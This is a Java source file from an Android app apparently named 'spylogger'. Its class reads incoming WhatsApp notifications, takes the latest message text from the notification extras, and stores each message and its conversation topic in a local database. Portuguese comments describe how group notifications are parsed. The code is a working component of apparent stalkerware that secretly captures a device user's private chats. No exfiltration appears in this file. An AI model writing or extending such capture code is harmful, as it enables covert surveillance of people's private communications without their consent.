package com.gravatasufoca.spylogger.helpers;

import android.app.Notification;
import android.content.Context;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.gravatasufoca.spylogger.model.Mensagem;

import java.sql.SQLException;

/**
 * Created by bruno on 04/06/17.
 */

public class WhatsNotificationAdd extends MensagemNotificacao {

    public WhatsNotificationAdd(Context context,StatusBarNotification sbn) {
        super(context,sbn);
    }

    @Override
    protected void add() {
       /*
       quando tem o contato, quer dizer que foi a primeira notificacao do grupo.
       quando nao tem o contato, quer dizer que faz parte do grupo e eh a primeira mensagem. Neste caso eu devo percorrer o grupo e pegar a mensagem com a tag!=null (tag eh o key do whats)
       nesta notificacao o android.textLine traz todas as mensagens.
        */
        Mensagem mensagem=getMensagem();

        if(mensagem!=null){
            try {
                getRepositorioTopico().inserirOuAtualizar(mensagem.getTopico());
                getRepositorioMensagem().inserirOuAtualizar(mensagem);
            } catch (SQLException e) {
                Log.d("spylogger",e.getMessage());
            }
        }

    }

    @Override
    protected String getTexto() {
        if(getSbn().getNotification().extras.get(Notification.EXTRA_TEXT_LINES)!=null) {
            String[] tmp = (String[]) getSbn().getNotification().extras.get(Notification.EXTRA_TEXT_LINES);
            return tmp[tmp.length-1];
        }
        return getMsgInfo(Notification.EXTRA_TEXT);
    }
}
